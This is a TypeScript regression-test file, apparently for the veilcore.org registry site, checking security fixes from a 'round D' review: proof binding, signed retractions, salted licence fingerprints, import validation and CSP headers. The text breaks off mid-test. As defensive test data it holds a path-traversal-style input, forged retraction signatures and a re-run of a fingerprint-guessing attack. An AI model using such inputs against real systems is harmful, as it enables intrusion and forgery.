// Round D hardening — veilcore.org. Regression tests for the findings in the round D
// site review: each one asserts the FIXED behaviour, so it fails if the hole reopens.
//
// Node section: fetch and localStorage are stubbed; nothing touches the network.
// Browser section: the built site (bboard-ui/dist, from `vite build --mode preprod`) is
// served with the exact headers scripts/vercel-config.mjs generates and driven in
// headless Chromium; every request leaving the page is answered here or aborted.
// Skipped when dist or the browser is missing.
//
// Run one file at a time: npx vitest run --maxWorkers=1 src/hardening-roundD.test.ts
// SPDX-License-Identifier: Apache-2.0

import { describe, it, expect, beforeAll, beforeEach, afterAll } from 'vitest';
import { createRequire } from 'node:module';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import type { AddressInfo } from 'node:net';
import { fileURLToPath } from 'node:url';

const HERE = path.dirname(fileURLToPath(import.meta.url));

// ---------------------------------------------------------------- environment shims

const mem = new Map<string, string>();
const storage = {
  getItem: (k: string) => (mem.has(k) ? (mem.get(k) as string) : null),
  setItem: (k: string, v: string) => void mem.set(k, String(v)),
  removeItem: (k: string) => void mem.delete(k),
  clear: () => mem.clear(),
  key: (i: number) => [...mem.keys()][i] ?? null,
  get length() {
    return mem.size;
  },
};
(globalThis as unknown as { localStorage: typeof storage }).localStorage = storage;

type Handler = (url: string, init?: RequestInit) => unknown;
let routes: { match: (u: string, m: string) => boolean; reply: Handler }[] = [];
const calls: { url: string; method: string; body?: string; headers?: Record<string, string> }[] = [];
const json = (v: unknown, status = 200) =>
  new Response(JSON.stringify(v), { status, headers: { 'content-type': 'application/json' } });
const withStatus = (status: number, body: unknown) => ({ __status: status, body });
let storedRecords: unknown[] = [];

globalThis.fetch = (input: RequestInfo | URL, init?: RequestInit): Promise<Response> => {
  const url = typeof input === 'string' ? input : input instanceof URL ? input.href : input.url;
  const method = (init?.method ?? 'GET').toUpperCase();
  calls.push({ url, method, body: init?.body as string | undefined, headers: init?.headers as Record<string, string> });
  for (const r of routes) {
    if (!r.match(url, method)) continue;
    const out = r.reply(url, init) as { __status?: number; body?: unknown };
    return Promise.resolve(
      out && typeof out === 'object' && '__status' in out ? json(out.body, out.__status) : json(out),
    );
  }
  // The registry's record set for the test holder: what was last saved is what loads.
  if (url.endsWith('/api/records')) {
    if (method === 'PUT') storedRecords = JSON.parse(init?.body as string) as unknown[];
    return Promise.resolve(json(method === 'GET' ? storedRecords : { ok: true }));
  }
  if (url.endsWith('/api/licenses')) return Promise.resolve(json(method === 'GET' ? [] : { ok: true }));
  return Promise.resolve(json({ error: 'no route' }, 404));
};

const route = (method: string, re: RegExp, reply: Handler) =>
  routes.push({ match: (u, m) => m === method && re.test(u), reply });

beforeEach(() => {
  routes = [];
  calls.length = 0;
});

const sha256hex = async (s: string) =>
  Array.from(new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s))), (b) =>
    b.toString(16).padStart(2, '0'),
  ).join('');

// ============================================== F11: no holder key, no polling, for visitors

describe('F11 a visitor who never saved anything gets no holder key and sends nothing', () => {
  it('loading records makes no request and mints no key', async () => {
    const { holderKeyIfAny } = await import('./veilcore/holder');
    const records = await import('./veilcore/records');
    expect(holderKeyIfAny()).toBeNull();
    await records.hydrate();
    expect(calls.filter((c) => c.url.includes('/api/'))).toHaveLength(0);
    expect(holderKeyIfAny()).toBeNull();
    expect(localStorage.getItem('veilcore.holder.v1')).toBeNull();
  });

  it('importing the record and licence stores starts no timer and no request', async () => {
    await import('./veilcore/licenses');
    await import('./veilcore/records');
    await new Promise((r) => setTimeout(r, 20));
    expect(calls).toHaveLength(0);
  });

  it('loadGrant without a key asks nothing', async () => {
    const { loadGrant } = await import('./veilcore/disclosure');
    expect(await loadGrant('VEIL-1')).toBeNull();
    expect(calls).toHaveLength(0);
  });
});

// ======================================================= F1: inclusion proof bound

describe('F1 proofFor: a proof counts only for this record, and an anchor is never "anchored" on the registry’s word', () => {
  it('a proof for a different commitment is rejected', async () => {
    const { buildBatch } = await import('veilcore-records');
    const { proofFor } = await import('./veilcore/proofs');
    const mine = 'a'.repeat(64);
    const other = 'b'.repeat(64);
    const batch = await buildBatch([other], 'forged');
    route('GET', /\/proof\//, () => ({
      ...batch.proofs[other],
      anchor: { chain: 'midnight', network: 'mainnet', txHash: 'deadbeef' },
    }));
    expect((await proofFor(mine)).status).toBe('none');
  });

  it('the empty-path proof of another commitment is rejected', async () => {
    const { buildBatch } = await import('veilcore-records');
    const { proofFor } = await import('./veilcore/proofs');
    const x = 'c'.repeat(64);
    const { proofs } = await buildBatch([x], 'b');
    route('GET', /\/proof\//, () => ({
      ...proofs[x],
      anchor: { chain: 'midnight', network: 'mainnet', txHash: '00' },
    }));
    expect((await proofFor('d'.repeat(64))).status).toBe('none');
  });

  it('a genuine proof with a reported anchor is "anchor-reported", never "anchored"', async () => {
    const { buildBatch } = await import('veilcore-records');
    const { proofFor } = await import('./veilcore/proofs');
    const mine = 'e'.repeat(64);
    const { proofs } = await buildBatch([mine, '1'.repeat(64), '2'.repeat(64)], 'b1');
    route('GET', /\/proof\//, () => ({
      ...proofs[mine],
      anchor: { chain: 'midnight', network: 'mainnet', txHash: 'ab' },
    }));
    const s = await proofFor(mine);
    expect(s.status).toBe('anchor-reported');
    route('GET', /\/proof\//, () => proofs[mine]);
    routes.shift();
    expect((await proofFor(mine)).status).toBe('pending');
  });

  it('a path that does not fold to its root, or one deeper than 64, is rejected', async () => {
    const { buildBatch } = await import('veilcore-records');
    const { proofFor } = await import('./veilcore/proofs');
    const mine = 'f'.repeat(64);
    const { proofs } = await buildBatch([mine, '3'.repeat(64)], 'b2');
    route('GET', /\/proof\//, () => ({ ...proofs[mine], root: '0'.repeat(64) }));
    expect((await proofFor(mine)).status).toBe('none');
    routes = [];
    const deep = Array.from({ length: 65 }, () => ({ sibling: '1'.repeat(64), siblingIsLeft: false }));
    route('GET', /\/proof\//, () => ({ ...proofs[mine], path: deep }));
    expect((await proofFor(mine)).status).toBe('none');
  });

  it('something that is not a commitment is not even requested', async () => {
    const { proofFor } = await import('./veilcore/proofs');
    expect((await proofFor('../../admin?x=1#')).status).toBe('none');
    expect(calls).toHaveLength(0);
  });
});

// ================================================== F2: attestation subject and retraction

describe('F2 attestationsFor: bound to this record; only signed retractions count', () => {
  const make = async (subject: string) => {
    const { generateKeypair, signAttestation } = await import('veilcore-records');
    const lab = await generateKeypair();
    const att = await signAttestation(
      {
        attestationId: `att_${subject.slice(0, 4)}`,
        type: 'laboratory-report',
        subjectCommitment: subject,
        attester: { publicKey: lab.publicKey, displayName: 'Real Lab' },
        documentHash: 'e'.repeat(64),
        hashAlgorithm: 'sha256',
        issuedAt: '2026-10-01T00:00:00Z',
      },
      lab.privateKey,
    );
    return { lab, att };
  };
  const listing = (a: object, retraction: unknown = null) => ({
    attestations: [
      { ...a, strength: 'signed', vettedAttester: true, registeredAs: { displayName: 'Real Lab' }, retraction },
    ],
  });

  it('a genuine signature about record X is not shown on record Y', async () => {
    const { attestationsFor } = await import('./veilcore/attesters');
    const { att } = await make('1'.repeat(64));
    route('GET', /\/attestations\/subject\//, () => listing(att));
    expect(await attestationsFor('2'.repeat(64))).toHaveLength(0);
    const [ok] = await attestationsFor('1'.repeat(64));
    expect(ok.signatureValid).toBe(true);
  });

  it('an unsigned "retraction" is ignored and said to be unverified', async () => {
    const { attestationsFor, strengthLabel, countsAsSigned } = await import('./veilcore/attesters');
    const rec = '3'.repeat(64);
    const { att } = await make(rec);
    route('GET', /\/attestations\/subject\//, () =>
      listing(att, {
        attestationId: att.attestationId,
        retractedAt: '2026-10-02T00:00:00Z',
        reason: 'issued-in-error',
      }),
    );
    const [a] = await attestationsFor(rec);
    expect(a.retraction).toBeNull();
    expect(a.retractionUnverified).toBe(true);
    expect(countsAsSigned(a)).toBe(true);
    expect(strengthLabel(a).label).toBe('Signed · checked by VeilCore');
    expect(strengthLabel(a).why).toMatch(/not signed by the attester, so it is ignored/);
  });

  it('a retraction signed by another key is ignored; one signed by the attester counts', async () => {
    const { generateKeypair, signRetraction } = await import('veilcore-records');
    const { attestationsFor, strengthLabel } = await import('./veilcore/attesters');
    const rec = '4'.repeat(64);
    const { lab, att } = await make(rec);
    const stranger = await generateKeypair();
    const base = {
      attestationId: att.attestationId,
      reason: 'issued-in-error' as const,
      retractedAt: '2026-10-02T00:00:00Z',
    };
    const forged = await signRetraction({ ...base, attesterPublicKey: stranger.publicKey }, stranger.privateKey);
    route('GET', /\/attestations\/subject\//, () => listing(att, forged));
    expect(strengthLabel((await attestationsFor(rec))[0]).label).not.toBe('Retracted');
    routes = [];
    const real = await signRetraction({ ...base, attesterPublicKey: lab.publicKey }, lab.privateKey);
    route('GET', /\/attestations\/subject\//, () => listing(att, real));
    const [a] = await attestationsFor(rec);
    expect(a.retraction?.signature).toBe(real.signature);
    expect(strengthLabel(a).label).toBe('Retracted');
  });
});

// ============================================ F3: export tied to the registered fingerprint

describe('F3 exported envelope carries the registered (anchored) fingerprint; late DNA pairing is not back-dated', () => {
  const base = {
    id: 'VEIL-ABC',
    strainName: 'Blue Test',
    bredBy: 'H',
    dateCreated: '2025-01-01',
    notes: '',
    loggedAt: Date.UTC(2025, 0, 1),
    nonce: '0'.repeat(64),
    profile: 'veilcore/profile/plant-variety/v1',
    recordFingerprint: '',
  };

  it('the export names the registered fingerprint, anyone can recompute it, and the envelope still verifies', async () => {
    const { fingerprintRecord } = await import('./veilcore/commitment');
    const { exportEnvelopeFor, REGISTERED_EXTENSION } = await import('./veilcore/envelope');
    const { verifyCommitment, canonicalise, buildBatch } = await import('veilcore-records');
    const recordFingerprint = await fingerprintRecord(base);
    const r = { ...base, recordFingerprint };
    const { proofs } = await buildBatch([recordFingerprint], 'b9');
    const proof = { ...proofs[recordFingerprint], anchor: { chain: 'midnight', network: 'preprod', txHash: 'cafe' } };
    const env = await exportEnvelopeFor(r, 'party-1', 'match', { status: 'anchor-reported', proof });
    const ext = env.extensions?.[REGISTERED_EXTENSION] as { fingerprint: string; fields: Record<string, unknown> };
    expect(ext.fingerprint).toBe(recordFingerprint);
    expect(await sha256hex(canonicalise(ext.fields))).toBe(recordFingerprint);
    expect((await verifyCommitment(env)).valid).toBe(true);
    expect(env.anchor.network).toBe('preprod');
    expect(env.anchor.txHash).toBe('cafe');
    expect(env.anchor.commitmentAlgorithm).toMatch(/Reported by the registry/);
    // Without a checked anchor, no network is claimed.
    const pending = await exportEnvelopeFor(r, 'party-1', 'match', { status: 'none' });
    expect(pending.anchor.network).toBe('undeployed');
  });

  it('a DNA report paired a year later is dated when it was paired and named as not covered', async () => {
    const { fingerprintRecord } = await import('./veilcore/commitment');
    const { exportEnvelopeFor, REGISTERED_EXTENSION } = await import('./veilcore/envelope');
    const recordFingerprint = await fingerprintRecord(base);
    const later = { ...base, recordFingerprint, dnaFingerprint: '9'.repeat(64), dnaPairedAt: Date.UTC(2026, 9, 1) };
    const env = await exportEnvelopeFor(later, 'party-1', 'match', { status: 'none' });
    expect(env.sealedAt).toBe('2026-10-01T00:00:00Z');
    const ext = env.extensions?.[REGISTERED_EXTENSION] as { sealedAt: string; notCovered: string[] };
    expect(ext.sealedAt).toBe('2025-01-01T00:00:00Z');
    expect(ext.notCovered.join(' ')).toMatch(/reportHash/);
  });

  it('a record whose fingerprint does not match its fields is not exported', async () => {
    const { exportEnvelopeFor } = await import('./veilcore/envelope');
    await expect(
      exportEnvelopeFor({ ...base, recordFingerprint: 'f'.repeat(64) }, 'p', 'mismatch', { status: 'none' }),
    ).rejects.toThrow(/does not match/);
  });
});

// =============================================== F4: licence fingerprint and counter-signing

describe('F4 licences: salted canonical fingerprint; one party cannot produce "both parties signed"', () => {
  const terms = {
    licensee: 'Acme Farms',
    rights: 'cultivate+propagate' as const,
    territory: 'NJ',
    startDate: '2026-10-04',
    endDate: '2027-10-04',
    royaltyType: 'percent' as const,
    royaltyAmount: '7',
    unitBasis: 'per-unit-sold' as const,
    offspringRoyaltyPct: '',
    sublicensable: false,
    exclusive: true,
    extraTerms: '',
    labPurpose: undefined,
  };
  const record = '7'.repeat(64);

  it('the terms cannot be recovered from the public face by guessing', async () => {
    const { sealAgreement } = await import('./veilcore/licenses');
    const { fingerprintText } = await import('./veilcore/commitment');
    const { agreementFingerprint } = await sealAgreement('license', terms, record);
    // The round D attack: rebuild the old unsalted preimage for each guess. It never matches.
    let found = false;
    for (const licensee of ['Beta Labs', 'Acme Farms'])
      for (let roy = 0; roy <= 20; roy++) {
        const guess = { ...terms, licensee, royaltyAmount: String(roy) };
        if ((await fingerprintText(JSON.stringify({ type: 'license', terms: guess, record }))) === agreementFingerprint)
          found = true;
      }
    expect(found).toBe(false);
    // Two agreements on identical terms get different fingerprints.
    expect((await sealAgreement('license', terms, record)).agreementFingerprint).not.toBe(agreementFingerprint);
  });

  it('with the salt it is canonical: key order does not matter, and it recomputes', async () => {
    const { sealAgreement, AGREEMENT_FINGERPRINT_V2 } = await import('./veilcore/licenses');
    const { canonicalise } = await import('veilcore-records');
    const salt = '5'.repeat(64);
    const reordered = Object.fromEntries(Object.entries(terms).reverse()) as typeof terms;
    const a = await sealAgreement('license', terms, record, salt);
    const b = await sealAgreement('license', reordered, record, salt);
    expect(a.agreementFingerprint).toBe(b.agreementFingerprint);
    const defined = JSON.parse(JSON.stringify(terms)) as Record<string, unknown>;
    expect(
      await sha256hex(canonicalise({ v: AGREEMENT_FINGERPRINT_V2, type: 'license', terms: defined, record, salt })),
    ).toBe(a.agreementFingerprint);
  });

  it('marking active from the issuing browser never reads as two parties; the salt is disclosed only with full terms', async () => {
    const lic = await import('./veilcore/licenses');
    const { certificateFor } = await import('./veilcore/license-certificate');
    const sealed = await lic.sealAgreement('license', terms, record);
    const l = lic.createLicense({ type: 'license', recordId: 'VEIL-1', recordFingerprint: record, terms, ...sealed });
    await lic.issueLicense(l.id);
    const after = await lic.countersignLicense(l.id);
    expect(after?.state).toBe('active');
    expect(after?.issuedByParty).toBe(after?.countersignedByParty);
    expect(lic.signedByTwoParties(after!)).toBe(false);
    expect(lic.STATE_LABEL.active).not.toMatch(/both/i);
    const partial = certificateFor(after!, ['existence', 'royalty']);
    expect(JSON.stringify(partial)).not.toContain(sealed.agreementSalt);
    expect(partial.public.countersignedByOtherParty).toBe(false);
    const full = certificateFor(after!, ['full']);
    expect(JSON.stringify(full)).toContain(sealed.agreementSalt);
    expect(lic.signedByTwoParties({ ...after!, countersignedByParty: 'someone-else' })).toBe(true);
  });
});

// ======================================= F5: the lab signs only what it was shown, consistently

describe('F5 custodySubject: a lab key signs only a source commitment every registry answer agrees on', () => {
  const sealed = {
    recordFingerprint: 'a'.repeat(64),
    receivedFromCommitment: 'b'.repeat(64),
    receivedFrom: 'VEIL-S',
    strainName: 'Blue',
    quantity: '10 cuttings',
  };
  const claim = { descendedFrom: 'VEIL-S', parentCommitment: 'b'.repeat(64) };

  it('agrees → a subject naming the full source fingerprint', async () => {
    const { custodySubject } = await import('./veilcore/transfers');
    const s = custodySubject({ receivedRecordId: 'VEIL-R', sealed, claim, publicFingerprint: 'b'.repeat(64) });
    expect('refuse' in s).toBe(false);
    if (!('refuse' in s)) {
      expect(s.sourceCommitment).toBe('b'.repeat(64));
      expect(s.sourceRecordId).toBe('VEIL-S');
    }
  });

  it('the claim, the stored record and the public page disagree → nothing to sign', async () => {
    const { custodySubject } = await import('./veilcore/transfers');
    const chosen = 'ab'.repeat(32);
    for (const s of [
      custodySubject({
        receivedRecordId: 'R',
        sealed: { ...sealed, receivedFromCommitment: chosen },
        claim,
        publicFingerprint: 'b'.repeat(64),
      }),
      custodySubject({
        receivedRecordId: 'R',
        sealed,
        claim: { ...claim, parentCommitment: chosen },
        publicFingerprint: 'b'.repeat(64),
      }),
      custodySubject({ receivedRecordId: 'R', sealed, claim, publicFingerprint: chosen }),
      custodySubject({ receivedRecordId: 'R', sealed, claim, publicFingerprint: null }),
      custodySubject({
        receivedRecordId: 'R',
        sealed: { ...sealed, receivedFrom: 'VEIL-OTHER' },
        claim,
        publicFingerprint: 'b'.repeat(64),
      }),
    ])
      expect('refuse' in s).toBe(true);
  });

  it('claiming alone signs nothing', async () => {
    const { claimTransfer } = await import('./veilcore/transfers');
    route('POST', /\/transfers\/.*\/claim$/, () => ({
      recordId: 'VEIL-R',
      descendedFrom: 'VEIL-S',
      parentCommitment: 'b'.repeat(64),
    }));
    const res = await claimTransfer('TR-1', 'code');
    expect('recordId' in res && res.parentCommitment).toBe('b'.repeat(64));
    expect(calls.some((c) => c.url.endsWith('/attestations'))).toBe(false);
  });
});

// ========================================= F6: import validation, merge, start over

describe('F6 importRecords: fabricated fields dropped, broken fingerprints refused, nothing overwritten', () => {
  const good = async (id: string, notes = '') => {
    const { fingerprintRecord } = await import('./veilcore/commitment');
    const r = {
      id,
      strainName: 'Cut',
      bredBy: 'Me',
      dateCreated: '2026-01-01',
      notes,
      loggedAt: Date.UTC(2026, 0, 1),
      nonce: '1'.repeat(64),
    };
    return { ...r, recordFingerprint: await fingerprintRecord(r) };
  };
  const file = (v: unknown) => new File([JSON.stringify(v)], 'restore.json', { type: 'application/json' });

  it('a record whose fingerprint does not match is refused, and nothing is uploaded', async () => {
    const records = await import('./veilcore/records');
    const forged = { ...(await good('VEIL-FORGED')), recordFingerprint: 'f'.repeat(64) };
    await expect(records.importRecords(file([await good('VEIL-OK'), forged]))).rejects.toThrow(/does not match/);
    await new Promise((r) => setTimeout(r, 10));
    expect(calls.some((c) => c.method === 'PUT')).toBe(false);
    expect(records.getRecord('VEIL-OK')).toBeUndefined();
  });

  it('registry-written fields in the file are dropped before anything is stored or sent', async () => {
    const records = await import('./veilcore/records');
    const r = {
      ...(await good('VEIL-IMP')),
      attestation: { lab: 'Eurofins Scientific', attestedAt: 1 },
      receivedFrom: 'VEIL-SOMEONE',
      receivedFromCommitment: 'c'.repeat(64),
      licenseIds: ['LIC-NOT-MINE'],
    };
    expect(await records.importRecords(file([r]))).toEqual({ added: 1, alreadyHere: 0 });
    await new Promise((res) => setTimeout(res, 10));
    const put = calls.find((c) => c.method === 'PUT' && c.url.endsWith('/api/records'));
    const sent = JSON.parse(String(put?.body)) as Record<string, unknown>[];
    const mine = sent.find((x) => x.id === 'VEIL-IMP');
    expect(mine?.attestation).toBeUndefined();
    expect(mine?.receivedFrom).toBeUndefined();
    expect(mine?.licenseIds).toBeUndefined();
    expect(await records.checkIntegrity(records.getRecord('VEIL-IMP')!)).toBe('match');
  });

  it('a record already here is never overwritten by the file', async () => {
    const records = await import('./veilcore/records');
    const before = records.getRecord('VEIL-IMP');
    const other = await good('VEIL-IMP', 'replaced notes');
    expect(await records.importRecords(file([other]))).toEqual({ added: 0, alreadyHere: 1 });
    expect(records.getRecord('VEIL-IMP')).toEqual(before);
  });

  it('files over the size limits are refused before they are read', async () => {
    const records = await import('./veilcore/records');
    const { fingerprintFile } = await import('./veilcore/commitment');
    const huge = (size: number) =>
      ({
        name: 'big.bin',
        size,
        text: () => Promise.reject(new Error('read')),
        arrayBuffer: () => Promise.reject(new Error('read')),
      }) as unknown as File;
    await expect(records.importRecords(huge(21 * 1024 * 1024))).rejects.toThrow(/larger than 20 MB/);
    await expect(fingerprintFile(huge(201 * 1024 * 1024))).rejects.toThrow(/larger than 200 MB/);
  });

  it('"start over" sends nothing to the registry and stops using the key', async () => {
    const records = await import('./veilcore/records');
    const { holderKeyIfAny } = await import('./veilcore/holder');
    expect(holderKeyIfAny()).toMatch(/^[0-9a-f]{64}$/);
    calls.length = 0;
    records.startOver();
    await new Promise((r) => setTimeout(r, 10));
    expect(calls).toHaveLength(0);
    expect(holderKeyIfAny()).toBeNull();
    expect(records.allRecords()).toHaveLength(0);
  });
});

// ======================================================= F7: attester key not overwritten

describe('F7 createAttester never replaces an existing key', () => {
  it('a retry after a failed publish keeps the first key and says why', async () => {
    const keys = await import('./veilcore/attester-keys');
    route('POST', /\/attesters$/, () => ({ error: 'registry unavailable' }));
    const first = await keys.createAttester('Lab', 'laboratory');
    expect((await keys.publishAttester(first)).error).toBeDefined();
    await expect(keys.createAttester('Lab', 'laboratory')).rejects.toThrow(/already exists/);
    expect(keys.loadAttester()?.keypair.privateKey).toBe(first.keypair.privateKey);
    routes = [];
    route('POST', /\/attesters$/, () => ({ attesterId: 'att-1' }));
    expect((await keys.publishAttester(first)).attesterId).toBe('att-1');
    expect(keys.loadAttester()?.registeredAt).toBeTypeOf('number');
  });
});

// =================================================== F12: disclosure is a stored grant

describe('F12 disclosure: the holder’s choice is saved as a grant before any link exists', () => {
  it('saveGrant PUTs exactly the switched-on keys with the holder key, and reports refusals', async () => {
    const { saveGrant, disclosureFrom } = await import('./veilcore/disclosure');
    route('PUT', /\/api\/records\/VEIL-1\/disclosure$/, (_u, init) => {
      const body = JSON.parse(init?.body as string) as { show: string[] };
      return { recordId: 'VEIL-1', show: body.show, updatedAt: '2026-10-04T00:00:00.000Z' };
    });
    const out = await saveGrant('VEIL-1', disclosureFrom(['existence', 'sealed-at']));
    expect(out).toEqual({ show: ['existence', 'sealed-at'], updatedAt: '2026-10-04T00:00:00.000Z' });
    const put = calls.find((c) => c.method === 'PUT');
    expect(JSON.parse(String(put?.body))).toEqual({ show: ['existence', 'sealed-at'] });
    expect(put?.headers?.['x-holder-key']).toMatch(/^[0-9a-f]{64}$/i);

    routes = [];
    route('PUT', /\/disclosure$/, () => withStatus(404, { error: 'no such record under this holder key' }));
    expect(await saveGrant('VEIL-1', disclosureFrom(['existence']))).toEqual({
      error: 'no such record under this holder key',
    });

    routes = [];
    route('PUT', /\/disclosure$/, () => ({ recordId: 'VEIL-1', show: ['existence', 'parent-names'], updatedAt: null }));
    const differs = await saveGrant('VEIL-1', disclosureFrom(['existence']));
    expect('error' in differs && differs.error).toMatch(/different set/);
  });

  it('the portfolio and other-agreement keys are gone from the choices', async () => {
    const { DISCLOSURE_FIELDS, toDisclosureKey } = await import('./veilcore/disclosure');
    expect(DISCLOSURE_FIELDS.map((f) => f.key)).not.toContain('holder-portfolio');
    expect(toDisclosureKey('others')).toBeUndefined();
    expect(toDisclosureKey('parents')).toBe('parent-names');
  });
});

// ======================================================= docs pinned and bundled

describe('Docs are bundled from the pinned package, not fetched from a branch', () => {
  it('the bundled text is the installed veilcore-records version, with an exact source commit', async () => {
    const docs = await import('./veilcore/docs');
    const lock = JSON.parse(fs.readFileSync(path.resolve(HERE, '../../package-lock.json'), 'utf8')) as {
      packages: Record<string, { version?: string }>;
    };
    expect(docs.DOCS_VERSION).toBe(lock.packages['node_modules/veilcore-records'].version);
    expect(docs.DOCS.spec.md).toBe(
      fs.readFileSync(path.resolve(HERE, '../../node_modules/veilcore-records/SPEC.md'), 'utf8'),
    );
    expect(docs.REPO_VIEW).toMatch(/\/blob\/[0-9a-f]{40}$/);
    for (const f of ['components/DocPage.tsx', 'veilcore/docs.ts'])
      expect(fs.readFileSync(path.join(HERE, f), 'utf8')).not.toMatch(/raw\.githubusercontent|\/main['`/]/);
  });
});

// ======================================================= browser (built site + real CSP)

// The parts of Playwright these tests use, typed here so nothing is `any`.
type PwRequest = { url(): string; method(): string; postData(): string | null };
type PwRoute = {
  request(): PwRequest;
  continue(): Promise<void>;
  fulfill(o: object): Promise<void>;
  abort(): Promise<void>;
};
type PwLocator = {
  click(): Promise<void>;
  check(): Promise<void>;
  fill(v: string): Promise<void>;
  count(): Promise<number>;
};
type PwPage = {
  exposeFunction(name: string, f: (v: string) => void): Promise<void>;
  addInitScript(f: () => void): Promise<void>;
  addScriptTag(o: { path: string }): Promise<unknown>;
  on(event: 'pageerror', f: (e: Error) => void): void;
  route(pattern: string, f: (r: PwRoute) => Promise<void>): Promise<void>;
  goto(url: string, o?: object): Promise<unknown>;
  waitForTimeout(ms: number): Promise<void>;
  waitForSelector(selector: string, o?: object): Promise<unknown>;
  evaluate<R, A = undefined>(f: (a: A) => R, a?: A): Promise<R>;
  getByRole(role: string, o: { name: string | RegExp }): PwLocator;
  getByLabel(label: string): PwLocator;
  locator(selector: string): PwLocator;
};
type PwContext = { newPage(): Promise<PwPage>; close(): Promise<void> };
type PwBrowser = { newContext(o?: object): Promise<PwContext>; close(): Promise<void> };

const DIST = path.resolve(HERE, '../dist');
const API = 'https://veilcore-api-production.up.railway.app';
const PW = ['/opt/node-tools/node_modules/playwright', '/home/claude/.npm-global/lib/node_modules/playwright'].find(
  (p) => fs.existsSync(p),
);
const CHROME = '/opt/pw-browsers/chromium-1194/chrome-linux/chrome';
const haveBrowser = Boolean(PW) && fs.existsSync(path.join(DIST, 'index.html')) && fs.existsSync(CHROME);

const prodHeaders = (): Record<string, string> => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'vcfg-'));
  fs.mkdirSync(path.join(dir, '.vercel/output'), { recursive: true });
  const r = spawnSync(process.execPath, [path.resolve(HERE, '../../scripts/vercel-config.mjs')], {
    cwd: dir,
    env: { ...process.env, VITE_API_BASE: API },
  });
  if (r.status !== 0) throw new Error(String(r.stderr));
  const cfg = JSON.parse(fs.readFileSync(path.join(dir, '.vercel/output/config.json'), 'utf8')) as {
    routes: { headers?: Record<string, string> }[];
  };
  return cfg.routes[0].headers ?? {};
};

describe.skipIf(!haveBrowser)('browser: built site under the production headers', () => {
  let browser: PwBrowser | undefined;
  let server: http.Server;
  let origin = '';
  let headers: Record<string, string> = {};

  beforeAll(async () => {
    headers = prodHeaders();
    // Served over plain http on 127.0.0.1, where upgrade-insecure-requests would send
    // every same-origin request to https and nothing would load. It is the one directive
    // left out here; every other header is sent exactly as generated.
    const served = {
      ...headers,
      'Content-Security-Policy': headers['Content-Security-Policy']
        .split('; ')
        .filter((d) => d !== 'upgrade-insecure-requests')
        .join('; '),
    };
    server = http.createServer((req, res) => {
      const u = new URL(req.url ?? '/', 'http://x');
      let p = path.join(DIST, decodeURIComponent(u.pathname));
      if (!p.startsWith(DIST) || !fs.existsSync(p) || fs.statSync(p).isDirectory()) p = path.join(DIST, 'index.html');
      const types: Record<string, string> = {
        '.js': 'text/javascript',
        '.css': 'text/css',
        '.html': 'text/html',
        '.wasm': 'application/wasm',
        '.png': 'image/png',
        '.jpg': 'image/jpeg',
        '.woff2': 'font/woff2',
        '.woff': 'font/woff',
      };
      res.writeHead(200, { ...served, 'content-type': types[path.extname(p)] ?? 'application/octet-stream' });
      fs.createReadStream(p).pipe(res);
    });
    await new Promise<void>((r) => server.listen(0, '127.0.0.1', () => r()));
    origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
    const { chromium } = createRequire(import.meta.url)(PW as string) as {
      chromium: { launch: (o: object) => Promise<PwBrowser> };
    };
    browser = await chromium.launch({ executablePath: CHROME });
  }, 60_000);

  afterAll(async () => {
    await browser?.close();
    server?.close();
  });

  type Api = (path: string, method: string, body: string | null) => unknown;
  const page = async (api: Api, init?: () => void) => {
    const ctx = await (browser as PwBrowser).newContext({ viewport: { width: 1280, height: 900 } });
    const pg = await ctx.newPage();
    const external: { url: string; method: string; body: string | null }[] = [];
    const violations: string[] = [];
    const errors: string[] = [];
    await pg.exposeFunction('__csp', (v: string) => violations.push(v));
    await pg.addInitScript(() => {
      document.addEventListener('securitypolicyviolation', (e) =>
        (window as unknown as { __csp: (s: string) => void }).__csp(`${e.violatedDirective} ${e.blockedURI}`),
      );
    });
    if (init) await pg.addInitScript(init);
    pg.on('pageerror', (e: Error) => errors.push(String(e)));
    await pg.route('**/*', (r: PwRoute) => {
      const req = r.request();
      const url: string = req.url();
      if (url.startsWith(origin)) return r.continue();
      external.push({ url, method: req.method(), body: req.postData() });
      if (url.startsWith(API)) {
        if (req.method() === 'OPTIONS')
          return r.fulfill({
            status: 204,
            headers: {
              'access-control-allow-origin': '*',
              'access-control-allow-headers': '*',
              'access-control-allow-methods': '*',
            },
          });
        const out = api(new URL(url).pathname + new URL(url).search, req.method(), req.postData()) as
          | { __status?: number; body?: unknown }
          | undefined;
        const status =
          out && typeof out === 'object' && '__status' in out
            ? (out.__status as number)
            : out === undefined
              ? 404
              : 200;
        const body = out && typeof out === 'object' && '__status' in out ? out.body : (out ?? { error: 'nope' });
        return r.fulfill({
          status,
          contentType: 'application/json',
          headers: {
            'access-control-allow-origin': '*',
            'access-control-allow-headers': '*',
            'access-control-allow-methods': '*',
          },
          body: JSON.stringify(body),
        });
      }
      return r.abort();
    });
    return { ctx, pg, external, violations, errors };
  };

  it('production headers: HSTS, COOP, CORP, Trusted Types required, no GitHub in connect-src', () => {
    const csp = headers['Content-Security-Policy'];
    expect(csp).toMatch(/frame-ancestors 'none'/);
    expect(csp).toMatch(/script-src 'self' 'wasm-unsafe-eval';/);
    expect(csp).toMatch(/require-trusted-types-for 'script'/);
    expect(csp).toMatch(/connect-src 'self' https:\/\/veilcore-api-production\.up\.railway\.app;/);
    expect(csp).not.toMatch(/githubusercontent/);
    expect(headers['Strict-Transport-Security']).toMatch(/max-age=\d{8}/);
    expect(headers['Cross-Origin-Opener-Policy']).toBe('same-origin');
    expect(headers['Cross-Origin-Resource-Policy']).toBe('same-origin');
    expect(headers['X-Frame-Options']).toBe('DENY');
  });

  const PAGES = [
    '/',
    '/founders',
    '/privacy',
    '/verify',
    '/records',
    '/new',
    '/licenses',
    '/implementations',
    '/docs/spec',
    '/docs/evidence',
    '/docs/integrate',
    '/verify/VEIL-X',
    '/license/LIC-X/sign',
  ];

  it('every main page loads with no page error and no CSP or Trusted Types violation, and mints no key', async () => {
    const report: Record<string, unknown> = {};
    for (const p of PAGES) {
      const { ctx, pg, violations, errors, external } = await page((u) =>
        u.startsWith('/verify/') ? { found: false } : undefined,
      );
      await pg.goto(`${origin}${p}`, { waitUntil: 'networkidle' });
      await pg.waitForTimeout(400);
